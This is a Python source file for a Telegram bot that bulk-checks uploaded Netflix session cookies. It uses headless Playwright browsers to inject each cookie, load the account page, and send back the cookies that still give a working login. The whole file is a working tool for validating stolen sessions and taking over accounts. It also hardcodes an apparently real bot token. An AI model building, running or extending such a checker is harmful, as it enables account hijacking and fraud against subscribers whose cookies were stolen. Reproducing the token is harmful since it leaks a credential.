import os
import uuid
import json
import asyncio
import re
import shutil
import logging
import multiprocessing
import time
from concurrent.futures import ProcessPoolExecutor
from pyunpack import Archive
from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, MessageHandler, CommandHandler,
    ContextTypes, filters, CallbackQueryHandler
)
from playwright.async_api import async_playwright

# ========== Configuration ==========
WORKERS = 5  # Change this to adjust worker count
BOT_TOKEN = "8430924374:AAGj45zNwtBfIMRo9pzY3HIcu1DBU2W6Rzk"
TARGET_URL = "https://www.netflix.com/account"

# ========== Logging ==========
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== Global Progress Tracking ==========
class ProgressTracker:
    def __init__(self):
        self.reset()
    
    def reset(self):
        self.total_files = 0
        self.processed_files = 0
        self.valid_files = 0
        self.invalid_files = 0
        self.status_message_id = None
        self.chat_id = None
        self.start_time = None
    
    def set_total(self, total):
        self.total_files = total
        self.start_time = time.time()
    
    def increment_processed(self, is_valid=False):
        self.processed_files += 1
        if is_valid:
            self.valid_files += 1
        else:
            self.invalid_files += 1

# Global progress tracker
progress = ProgressTracker()

# ========== Helpers ==========

def normalize_cookie(c):
    out = {
        "name": c["name"],
        "value": c["value"],
        "domain": c.get("domain"),
        "path": c.get("path", "/"),
        "httpOnly": c.get("httpOnly", False),
        "secure": c.get("secure", False),
    }
    if "expires" in c and isinstance(c["expires"], (int, float)):
        out["expires"] = c["expires"]

    ss = c.get("sameSite", "").lower()
    mapping = {
        "lax": "Lax",
        "strict": "Strict",
        "none": "None",
        "no_restriction": "None",
        "unspecified": "Lax",
        "": "Lax"
    }
    out["sameSite"] = mapping.get(ss, "Lax")
    return out

def next_export_filename(base="working", ext=".txt"):
    files = [f for f in os.listdir() if f.startswith(base) and f.endswith(ext)]
    nums = [int(re.search(rf"{base}(\d+){ext}", f).group(1)) for f in files if re.search(rf"{base}(\d+){ext}", f)]
    next_num = max(nums, default=0) + 1
    return f"{base}{next_num}{ext}"

def parse_cookie(cookie_str: str):
    """
    Accept either:
      1) A single-line Cookie header string e.g. "a=1; b=2"
      2) A JSON array in the 'EditThisCookie'-like style
    Returns a dict {name: value}
    """
    cookie_str = cookie_str.strip()
    # Try JSON first
    if cookie_str.startswith('[') or cookie_str.startswith('{'):
        try:
            data = json.loads(cookie_str)
            if isinstance(data, dict):
                data = [data]
            if isinstance(data, list):
                out = {}
                for item in data:
                    if isinstance(item, dict) and 'name' in item and 'value' in item:
                        out[str(item['name'])] = str(item['value'])
                if out:
                    return out
        except Exception:
            pass
    # Fallback to header format (a=1; b=2)
    out = {}
    for part in cookie_str.split(';'):
        if '=' in part:
            name, value = part.split('=', 1)
            out[name.strip()] = value.strip()
    return out if out else None

def _cookie_dict_to_playwright(cookie_dict):
    """
    Convert {name:value} dict to Playwright cookie format.
    """
    cookies = []
    for name, value in cookie_dict.items():
        cookies.append({
            "name": name,
            "value": value,
            "domain": ".netflix.com",
            "path": "/",
            "secure": True,
            "httpOnly": False
        })
    return cookies

def create_status_keyboard(valid_count=0, invalid_count=0):
    """Create inline keyboard with status buttons"""
    keyboard = [
        [
            InlineKeyboardButton(f"✅ Valid: {valid_count}", callback_data="valid_status"),
            InlineKeyboardButton(f"❌ Invalid: {invalid_count}", callback_data="invalid_status")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== Progress Updater ==========

async def update_progress_message(context, force_update=False):
    """Update the progress message with current status"""
    if not progress.status_message_id or not progress.chat_id:
        return
    
    # Calculate processing speed
    elapsed_time = time.time() - progress.start_time if progress.start_time else 0
    speed = progress.processed_files / elapsed_time if elapsed_time > 0 else 0
    
    # Create progress bar
    if progress.total_files > 0:
        progress_percent = (progress.processed_files / progress.total_files) * 100
        bar_length = 20
        filled_length = int(bar_length * progress.processed_files / progress.total_files)
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
    else:
        progress_percent = 0
        bar = '░' * 20
    
    # Format time
    def format_time(seconds):
        if seconds < 60:
            return f"{seconds:.1f}s"
        elif seconds < 3600:
            return f"{int(seconds//60)}m {int(seconds%60)}s"
        else:
            return f"{int(seconds//3600)}h {int((seconds%3600)//60)}m"
    
    # Estimate remaining time
    if speed > 0 and progress.processed_files < progress.total_files:
        remaining_files = progress.total_files - progress.processed_files
        eta = remaining_files / speed
        eta_text = f"ETA: {format_time(eta)}"
    else:
        eta_text = "ETA: --"
    
    status_text = f"📊 **Processing Status**\n\n"
    status_text += f"📁 Processing: **{progress.processed_files}/{progress.total_files}**\n"
    status_text += f"📈 Progress: **{progress_percent:.1f}%**\n"
    status_text += f"`{bar}`\n\n"
    status_text += f"⚡ Speed: **{speed:.1f} files/sec**\n"
    status_text += f"⏱️ Elapsed: **{format_time(elapsed_time)}**\n"
    status_text += f"🕒 {eta_text}\n\n"
    status_text += f"✅ Valid: **{progress.valid_files}**\n"
    status_text += f"❌ Invalid: **{progress.invalid_files}**"
    
    try:
        await context.bot.edit_message_text(
            chat_id=progress.chat_id,
            message_id=progress.status_message_id,
            text=status_text,
            parse_mode='Markdown',
            reply_markup=create_status_keyboard(progress.valid_files, progress.invalid_files)
        )
    except Exception as e:
        if "message is not modified" not in str(e).lower():
            logger.warning(f"Failed to update progress message: {e}")

# ========== Worker Process Function ==========
def process_cookie_file_worker(input_path):
    """Worker function that runs in separate process"""
    import asyncio
    from playwright.async_api import async_playwright

    async def _process():
        cookie_dicts = []
        try:
            with open(input_path, "r", encoding="utf-8") as f:
                for line in f:
                    parsed = parse_cookie(line)
                    if parsed:
                        cookie_dicts.append(parsed)
        except Exception as e:
            logger.error(f"[Worker {os.getpid()}] Failed to read cookie file: {e}")
            return None

        if not cookie_dicts:
            logger.error(f"[Worker {os.getpid()}] No valid cookies found in file")
            return None

        export_paths = []

        async with async_playwright() as p:
            for cookie_dict in cookie_dicts:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context()

                try:
                    await context.add_cookies(_cookie_dict_to_playwright(cookie_dict))
                except Exception as e:
                    logger.warning(f"[Worker {os.getpid()}] Cookie inject failed: {e}")
                    await browser.close()
                    continue

                page = await context.new_page()
                await page.goto(TARGET_URL, wait_until="load")
                await page.wait_for_load_state("networkidle")

                if page.url.startswith(TARGET_URL):
                    new_cookies = await context.cookies()
                    if new_cookies:
                        export_path = next_export_filename()
                        with open(export_path, "w", encoding="utf-8") as f:
                            json.dump(new_cookies, f, separators=(",", ":"))
                        export_paths.append(export_path)
                        logger.info(f"[Worker {os.getpid()}] Exported cookies to {export_path}")
                else:
                    logger.warning(f"[Worker {os.getpid()}] ❌ Invalid NetflixId")

                await browser.close()

        return export_paths if export_paths else None

    return asyncio.run(_process())

# ========== Process Pool Management ==========
class WorkerPool:
    def __init__(self, max_workers=WORKERS):
        self.max_workers = max_workers
        self.executor = None
        self.active_tasks = 0
    
    def start(self):
        if self.executor is None:
            self.executor = ProcessPoolExecutor(max_workers=self.max_workers)
            logger.info(f"Started worker pool with {self.max_workers} workers")
    
    def stop(self):
        if self.executor:
            self.executor.shutdown(wait=True)
            self.executor = None
            logger.info("Worker pool stopped")
    
    async def process_file(self, file_path):
        if not self.executor:
            self.start()
        
        self.active_tasks += 1
        logger.info(f"Active tasks: {self.active_tasks}/{self.max_workers}")
        
        loop = asyncio.get_event_loop()
        try:
            result = await loop.run_in_executor(
                self.executor,
                process_cookie_file_worker,
                file_path
            )
            return result
        except Exception as e:
            logger.error(f"Worker process failed: {e}")
            return None
        finally:
            self.active_tasks -= 1
            logger.info(f"Task completed. Active tasks: {self.active_tasks}/{self.max_workers}")


# Global worker pool instance
worker_pool = WorkerPool(max_workers=WORKERS)

# Semaphore to control concurrent operations
semaphore = asyncio.Semaphore(WORKERS)

async def process_cookie_file(input_path, context):
    """Main interface for processing cookie files using worker pool with concurrency control"""
    async with semaphore:
        result = await worker_pool.process_file(input_path)

        # Update progress here (in main process)
        if result:
            progress.increment_processed(is_valid=True)
        else:
            progress.increment_processed(is_valid=False)

        await update_progress_message(context)
        return result


async def send_result(update, exported_path, filename=None):
    """Send valid cookie file back to user"""
    if exported_path and os.path.isfile(exported_path):
        file_size = os.path.getsize(exported_path)
        if file_size > 10:
            with open(exported_path, "rb") as f:
                display_name = filename if filename else os.path.basename(exported_path)
                await update.message.reply_document(
                    document=InputFile(f, filename=f"valid_{display_name}"),
                    caption=f"✅ **Valid Cookie File**\n📁 Original: `{filename or 'Unknown'}`\n📊 Size: {file_size} bytes",
                    parse_mode='Markdown'
                )
        else:
            logger.warning(f"Exported file for {filename or 'file'} is too small.")
        
        # Clean up the temporary file
        try:
            os.remove(exported_path)
        except:
            pass
        return True
    else:
        return False


# ========== Parallel Processing Functions ==========
async def process_files_in_parallel(txt_files, update, context):
    """Process multiple files in parallel using all available workers"""
    total_files = len(txt_files)
    progress.set_total(total_files)
    progress.chat_id = update.effective_chat.id
    
    # Send initial progress message
    status_msg = await update.message.reply_text(
        "🚀 **Starting Processing...**\n\n📁 Initializing workers...",
        parse_mode='Markdown',
        reply_markup=create_status_keyboard(0, 0)
    )
    progress.status_message_id = status_msg.message_id
    
    # Create tasks for all files
    tasks = []
    file_info = []
    
    for full_path, filename in txt_files:
        task = process_cookie_file(full_path, context)
        tasks.append(task)
        file_info.append((full_path, filename))
    
    # Process all files in parallel
    logger.info(f"Executing {len(tasks)} tasks in parallel...")
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Process results and send valid files
    for i, (result, (full_path, filename)) in enumerate(zip(results, file_info)):
        if isinstance(result, Exception):
            logger.error(f"Failed to process {filename}: {result}")
        elif result:
            for exported_path in result:  # result is list of JSON files
                await send_result(update, exported_path, filename)
    
    # Final status update
    await update_progress_message(context, force_update=True)
    
    return progress.valid_files


async def process_files_in_batches(txt_files, update, context, batch_size=None):
    """Process files in batches for better progress tracking with large archives"""
    if batch_size is None:
        batch_size = WORKERS * 2
    
    total_files = len(txt_files)
    progress.set_total(total_files)
    progress.chat_id = update.effective_chat.id
    
    # Send initial progress message
    status_msg = await update.message.reply_text(
        "🚀 **Starting Batch Processing...**\n\n📁 Preparing large archive...",
        parse_mode='Markdown',
        reply_markup=create_status_keyboard(0, 0)
    )
    progress.status_message_id = status_msg.message_id
    
    # Process files in batches
    for i in range(0, total_files, batch_size):
        batch = txt_files[i:i + batch_size]
        
        # Process current batch in parallel
        batch_tasks = []
        batch_info = []
        
        for full_path, filename in batch:
            task = process_cookie_file(full_path, context)
            batch_tasks.append(task)
            batch_info.append((full_path, filename))
        
        # Execute batch in parallel
        batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
        
        # Handle batch results and send valid files
        for result, (full_path, filename) in zip(batch_results, batch_info):
            if isinstance(result, Exception):
                logger.error(f"Failed to process {filename}: {result}")
                progress.increment_processed(is_valid=False)
            elif result:
                for exported_path in result:
                    await send_result(update, exported_path, filename)
                progress.increment_processed(is_valid=True)
            else:
                progress.increment_processed(is_valid=False)

            # 🔧 Update progress after each file
            await update_progress_message(context)
    
    # Final status update
    await update_progress_message(context, force_update=True)
    
    return progress.valid_files


# ========== Bot Commands ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = (
        "🎬 **Netflix Cookie Validator Bot**\n\n"
        "👋 Send me a `.txt`, `.zip`, or `.rar` cookie file and I'll validate each NetflixId for you.\n\n"
        f"⚡ Parallel Workers: {WORKERS}\n"
        "📊 Real-time progress tracking\n"
        "🚀 Ready to process your cookies!"
    )
    await update.message.reply_text(welcome_text, parse_mode='Markdown')


async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🏓 **Pong!**\n\n"
        f"⚙️ **System Status:**\n"
        f"• Workers: {WORKERS}\n"
        f"• Active Tasks: {worker_pool.active_tasks}\n"
        f"• Status: Ready\n"
        f"• Parallel Processing: Enabled",
        parse_mode='Markdown'
    )


async def workers_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command to show current worker configuration"""
    pool_status = 'Running' if worker_pool.executor else 'Stopped'
    info_text = (
        f"⚙️ **Worker Configuration**\n\n"
        f"• Active Workers: **{WORKERS}**\n"
        f"• Pool Status: **{pool_status}**\n"
        f"• Active Tasks: **{worker_pool.active_tasks}**\n"
        f"• Process ID: **{os.getpid()}**\n"
        f"• Current Processing: **{progress.processed_files}/{progress.total_files}**"
    )
    await update.message.reply_text(info_text, parse_mode='Markdown')


async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline keyboard button presses"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "valid_status":
        await query.answer("✅ Valid cookies will be sent automatically.")
    elif query.data == "invalid_status":
        await query.answer("❌ Invalid cookies are discarded.")


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document:
        await update.message.reply_text("❌ Please send a valid file.")
        return

    file_ext = os.path.splitext(document.file_name)[-1].lower()

    if file_ext not in [".txt", ".zip", ".rar"]:
        await update.message.reply_text(
            "❌ **Invalid file format!**\n\n"
            "Please send only:\n"
            "• `.txt` cookie files\n"
            "• `.zip` archives\n"
            "• `.rar` archives",
            parse_mode='Markdown'
        )
        return

    # Reset progress tracker for new job
    progress.reset()
    
    unique_id = uuid.uuid4().hex[:8]
    downloaded_name = f"upload_{unique_id}{file_ext}"
    
    # Download file with progress indicator
    download_msg = await update.message.reply_text("📥 **Downloading file...**", parse_mode='Markdown')
    telegram_file = await document.get_file()
    await telegram_file.download_to_drive(downloaded_name)
    await download_msg.edit_text("✅ **File downloaded successfully!**", parse_mode='Markdown')

    if file_ext == ".txt":
        # Split the .txt into one-line temp files
        temp_files = []
        with open(downloaded_name, "r", encoding="utf-8") as f:
            for i, line in enumerate(f, start=1):
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                temp_name = f"temp_line_{i}.txt"
                with open(temp_name, "w", encoding="utf-8") as temp_f:
                    temp_f.write(line + "\n")
                # ✅ keep original file name, no extra .txt_line
                temp_files.append((temp_name, document.file_name))


        # Run in parallel with workers
        if len(temp_files) <= 10:
            processed = await process_files_in_parallel(temp_files, update, context)
        else:
            processed = await process_files_in_batches(temp_files, update, context)

        # Final summary
        final_text = (
            f"✅ **Processing Complete!**\n\n"
            f"📁 File: `{document.file_name}`\n"
            f"📊 Valid: {progress.valid_files}\n"
            f"❌ Invalid: {progress.invalid_files}\n"
            f"⏱️ Processing time: {time.time() - progress.start_time:.1f}s"
        )
        await update.message.reply_text(final_text, parse_mode='Markdown')

        # Cleanup
        for fpath, _ in temp_files:
            os.remove(fpath)
        os.remove(downloaded_name)

    else:
        extract_msg = await update.message.reply_text("📦 **Extracting archive...**", parse_mode='Markdown')
        extract_dir = f"extracted_{unique_id}"
        os.makedirs(extract_dir, exist_ok=True)
        
        try:
            Archive(downloaded_name).extractall(extract_dir)
            await extract_msg.edit_text("✅ **Archive extracted successfully!**", parse_mode='Markdown')
        except Exception as e:
            await extract_msg.edit_text(f"❌ **Extraction failed:** `{str(e)[:100]}`", parse_mode='Markdown')
            shutil.rmtree(extract_dir)
            os.remove(downloaded_name)
            return

        # Collect all .txt files
        txt_files = []
        for root, dirs, files in os.walk(extract_dir):
            for filename in files:
                if filename.endswith(".txt"):
                    txt_files.append((os.path.join(root, filename), filename))
        
        if not txt_files:
            await update.message.reply_text(
                "❌ **No cookie files found!**\n\n"
                "The archive doesn't contain any `.txt` files.",
                parse_mode='Markdown'
            )
            shutil.rmtree(extract_dir)
            os.remove(downloaded_name)
            return
        
        # Choose processing method based on file count
        if len(txt_files) <= 10:
            processed = await process_files_in_parallel(txt_files, update, context)
        else:
            processed = await process_files_in_batches(txt_files, update, context)

        # Send summary
        summary_text = (
            f"🎉 **Processing Complete!**\n\n"
            f"📁 **Archive:** `{document.file_name}`\n"
            f"📊 **Results:**\n"
            f"• Total files: **{len(txt_files)}**\n"
            f"• Valid cookies: **{progress.valid_files}**\n"
            f"• Invalid cookies: **{progress.invalid_files}**\n"
            f"• Success rate: **{(progress.valid_files/len(txt_files)*100):.1f}%**\n\n"
            f"⚡ **Performance:**\n"
            f"• Workers used: **{WORKERS}**\n"
            f"• Processing time: **{time.time() - progress.start_time:.1f}s**\n"
            f"• Average speed: **{len(txt_files)/(time.time() - progress.start_time):.1f} files/sec**"
        )
        
        await update.message.reply_text(summary_text, parse_mode='Markdown')

        shutil.rmtree(extract_dir)
        os.remove(downloaded_name)


# ========== Application Shutdown Handler ==========
async def shutdown_handler(app):
    """Gracefully shutdown worker pool"""
    logger.info("Shutting down worker pool...")
    worker_pool.stop()


# ========== Run Bot ==========
async def post_init(app):
    await app.bot.delete_webhook(drop_pending_updates=True)
    me = await app.bot.get_me()
    logger.info("✅ Logged in as @%s (%s)", me.username, me.id)
    logger.info(f"🔧 Initialized with {WORKERS} parallel workers")
    
    # Start worker pool
    worker_pool.start()


if __name__ == "__main__":
    multiprocessing.set_start_method('spawn', force=True)
    
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ping", ping))
    app.add_handler(CommandHandler("workers", workers_info))
    app.add_handler(CallbackQueryHandler(handle_callback_query))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    try:
        print(f"🤖 Netflix Cookie Bot is running with {WORKERS} parallel workers...")
        print(f"⚡ Real-time progress tracking enabled")
        print(f"📊 Enhanced UI with inline status buttons")
        app.run_polling(drop_pending_updates=True)
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    finally:
        worker_pool.stop()


